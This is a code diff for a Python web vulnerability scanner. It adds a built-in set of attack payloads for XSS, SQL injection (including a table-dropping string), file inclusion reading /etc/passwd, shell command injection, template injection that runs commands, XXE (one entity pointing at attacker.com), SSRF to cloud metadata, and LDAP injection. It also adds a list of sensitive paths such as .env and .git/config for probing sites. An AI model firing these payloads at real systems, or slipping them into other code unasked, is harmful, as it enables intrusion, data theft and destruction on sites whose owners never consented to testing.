@@ -1449,14 +1449,116 @@ class ParameterAnalyzer:
 
 class WordlistMapper:
     """Map vulnerabilities to appropriate wordlists"""
-    
+
+    # Built-in payloads when external wordlists are not available
+    BUILTIN_PAYLOADS = {
+        'xss': [
+            '<script>alert(1)</script>',
+            '"><script>alert(1)</script>',
+            "'-alert(1)-'",
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '"><img src=x onerror=alert(1)>',
+            "javascript:alert(1)",
+            '<body onload=alert(1)>',
+            '{{constructor.constructor("alert(1)")()}}',
+            '${alert(1)}',
+            '<iframe src="javascript:alert(1)">',
+            '"><svg/onload=alert(1)>',
+            "';alert(1)//",
+            '<script>alert(String.fromCharCode(88,83,83))</script>',
+            '<ScRiPt>alert(1)</ScRiPt>',
+        ],
+        'sqli': [
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "' OR '1'='1'/*",
+            "1' OR '1'='1",
+            "admin'--",
+            "1; DROP TABLE users--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT 1,2,3--",
+            "1' AND '1'='1",
+            "' OR 1=1--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "1' AND SLEEP(5)--",
+            "' OR ''='",
+            "') OR ('1'='1",
+            "-1' OR 1=1--",
+        ],
+        'lfi': [
+            '../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '/etc/passwd',
+            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            '....//....//....//windows/system32/drivers/etc/hosts',
+            '/proc/self/environ',
+            'php://filter/convert.base64-encode/resource=index.php',
+            'file:///etc/passwd',
+            '..%2f..%2f..%2fetc/passwd',
+            '..%252f..%252f..%252fetc/passwd',
+        ],
+        'rce': [
+            '; id',
+            '| id',
+            '`id`',
+            '$(id)',
+            '; cat /etc/passwd',
+            '| cat /etc/passwd',
+            '; whoami',
+            '| whoami',
+            '& ping -c 1 127.0.0.1',
+            '; sleep 5',
+        ],
+        'ssti': [
+            '{{7*7}}',
+            '${7*7}',
+            '<%= 7*7 %>',
+            '{{config}}',
+            '{{self}}',
+            '{{request}}',
+            '${T(java.lang.Runtime).getRuntime().exec("id")}',
+            '{{constructor.constructor("return this")()}}',
+            '#{7*7}',
+            '*{7*7}',
+        ],
+        'xxe': [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
+        ],
+        'ssrf': [
+            'http://127.0.0.1',
+            'http://localhost',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://[::1]',
+            'http://0.0.0.0',
+            'http://2130706433',  # 127.0.0.1 as decimal
+            'file:///etc/passwd',
+        ],
+        'ldapi': [
+            '*)(uid=*))(|(uid=*',
+            '*)(&',
+            '*)(objectClass=*',
+            'admin)(&)',
+            'admin)(|(password=*)',
+        ],
+        'idor': [
+            '1',
+            '0',
+            '-1',
+            '999999',
+            '../1',
+            '1;2',
+        ],
+    }
+
     def __init__(self, base_paths=None):
         self.base_paths = base_paths or {
             'fuzzdb': '/usr/share/wordlists/fuzzdb',
             'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
             'seclists': '/usr/share/wordlists/SecLists'
         }
-        
+
         self.wordlist_map = {
             'xss': {
                 'fuzzdb': [
@@ -3431,12 +3533,15 @@ class SmartCrawler:
         - Payload validation per skippare payload invalidi
         - Rate limiting integrato
         - Performance monitoring
+        - FALLBACK to built-in payloads when wordlists not available
         """
         tested_payloads = set()  # Per evitare duplicati
         max_payloads_per_list = 10  # Limit for immediate testing
 
         # Collect payloads con LAZY LOADING
         all_payloads = []
+        loaded_from_files = False
+
         for wordlist in wordlists[:3]:  # Limit to first 3 wordlists
             if not os.path.exists(wordlist['path']):
                 continue
@@ -3460,6 +3565,7 @@ class SmartCrawler:
 
                 if self.verbose and payload_count > 0:
                     print(f"    📚 Loaded {payload_count} payloads from: {wordlist['source']}/{wordlist['relative_path']}")
+                    loaded_from_files = True
 
             except IOError as e:
                 logger.error(f"IO error reading wordlist {wordlist['path']}: {e}")
@@ -3468,6 +3574,13 @@ class SmartCrawler:
                 logger.error(f"Unexpected error reading wordlist {wordlist['path']}: {e}", exc_info=True)
                 self.performance_monitor.increment_errors()
                 continue
+
+        # FALLBACK: Use built-in payloads if no external wordlists loaded
+        if not all_payloads and vuln_type in WordlistMapper.BUILTIN_PAYLOADS:
+            all_payloads = WordlistMapper.BUILTIN_PAYLOADS[vuln_type][:max_payloads_per_list]
+            if self.verbose:
+                print(f"    📦 Using {len(all_payloads)} built-in payloads for {vuln_type}")
+            logger.info(f"Using built-in payloads for {vuln_type} (no external wordlists)")
 
         # Sort and unique (sort | uniq)
         unique_payloads = sorted(list(set(all_payloads)))
@@ -4044,7 +4157,16 @@ class SmartCrawler:
         # Collect all paths to test
         all_paths = []
         for wordlist in wordlists:
-            if os.path.exists(wordlist['path']):
+            # Handle built-in wordlist
+            if wordlist['path'] == '__builtin__':
+                for path in self.BUILTIN_PATHS:
+                    if path not in tested_paths:
+                        all_paths.append((path, 'builtin'))
+                        tested_paths.add(path)
+                        if len(all_paths) >= max_paths:
+                            break
+                logger.info(f"Loaded {len(self.BUILTIN_PATHS)} paths from built-in wordlist")
+            elif os.path.exists(wordlist['path']):
                 try:
                     with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                         paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
@@ -4058,7 +4180,7 @@ class SmartCrawler:
                     logger.info(f"Loaded {len(paths)} paths from {wordlist['technology']} wordlist")
                 except Exception as e:
                     logger.error(f"Error reading wordlist {wordlist['path']}: {e}")
-            
+
             if len(all_paths) >= max_paths:
                 break
         
@@ -4086,18 +4208,64 @@ class SmartCrawler:
         if self.verbose:
             print(f"  📊 Queue size after discovery: {self.url_queue.qsize()} URLs to process")
     
+    # Built-in common paths for discovery when no external wordlists available
+    BUILTIN_PATHS = [
+        # Admin panels
+        'admin', 'administrator', 'admin.php', 'admin.html', 'admin/', 'Admin',
+        'adminpanel', 'admin_panel', 'cpanel', 'controlpanel', 'dashboard',
+        'manage', 'management', 'manager', 'login', 'signin', 'auth',
+        # API endpoints
+        'api', 'api/', 'api/v1', 'api/v2', 'v1', 'v2', 'rest', 'graphql',
+        'api/users', 'api/admin', 'api/config', 'api/status', 'api/health',
+        # Configuration
+        'config', 'configuration', 'settings', 'setup', 'install',
+        'config.php', 'config.json', 'config.yml', 'config.xml',
+        '.env', 'env', '.git', '.git/config', '.gitignore',
+        # Database tools
+        'phpmyadmin', 'pma', 'adminer', 'mysql', 'database', 'db',
+        'phpMyAdmin', 'phpmyadmin/', 'adminer.php',
+        # Debug/dev
+        'debug', 'test', 'testing', 'dev', 'development', 'staging',
+        'console', 'shell', 'terminal', 'phpinfo.php', 'info.php',
+        # Common files
+        'robots.txt', 'sitemap.xml', 'crossdomain.xml', '.htaccess',
+        'web.config', 'readme.txt', 'README.md', 'changelog.txt',
+        'backup', 'backup/', 'backups', 'old', 'temp', 'tmp',
+        # User areas
+        'user', 'users', 'account', 'profile', 'member', 'members',
+        'register', 'signup', 'logout', 'password', 'reset',
+        # Content
+        'upload', 'uploads', 'files', 'images', 'assets', 'static',
+        'media', 'content', 'downloads', 'docs', 'documentation',
+        # Server status
+        'status', 'health', 'ping', 'version', 'info', 'server-status',
+        'server-info', '.well-known', 'metrics', 'stats',
+        # Security
+        'private', 'secure', 'protected', 'restricted', 'internal',
+        'secret', 'hidden', 'confidential',
+        # CMS common
+        'wp-admin', 'wp-login.php', 'wp-content', 'wp-includes',
+        'administrator/', 'joomla', 'drupal', 'wordpress',
+        # Frameworks
+        'app', 'application', 'apps', 'src', 'public', 'web',
+        'vendor', 'node_modules', 'bower_components',
+        # Common vulnerable endpoints
+        'cgi-bin', 'cgi', 'scripts', 'bin', 'exec',
+        'includes', 'include', 'inc', 'lib', 'libs', 'library'
+    ]
+
     def get_discovery_wordlists(self):
         """Select wordlists based on detected technologies"""
         wordlists = []
         added_sources = set()
-        
+
         # Always include generic wordlists
         generic_lists = self.discovery_mapper.get_wordlists('generic')
         for wl in generic_lists:
             if wl['path'] not in added_sources:
                 wordlists.append(wl)
                 added_sources.add(wl['path'])
-        
+
         # Add CMS-specific wordlists
         if self.results['technologies'].get('cms'):
             cms = self.results['technologies']['cms'].lower()
@@ -4106,7 +4274,7 @@ class SmartCrawler:
                 if wl['path'] not in added_sources:
                     wordlists.append(wl)
                     added_sources.add(wl['path'])
-        
+
         # Add language-specific wordlists
         if self.results['technologies'].get('language'):
             lang = self.results['technologies']['language'].lower()
@@ -4115,7 +4283,16 @@ class SmartCrawler:
                 if wl['path'] not in added_sources:
                     wordlists.append(wl)
                     added_sources.add(wl['path'])
-        
+
+        # FALLBACK: If no external wordlists found, use built-in paths
+        if not wordlists:
+            logger.info("No external wordlists found, using built-in path list")
+            wordlists.append({
+                'path': '__builtin__',
+                'source': 'builtin',
+                'technology': 'generic'
+            })
+
         logger.info(f"Selected {len(wordlists)} wordlists for discovery")
         return wordlists
     
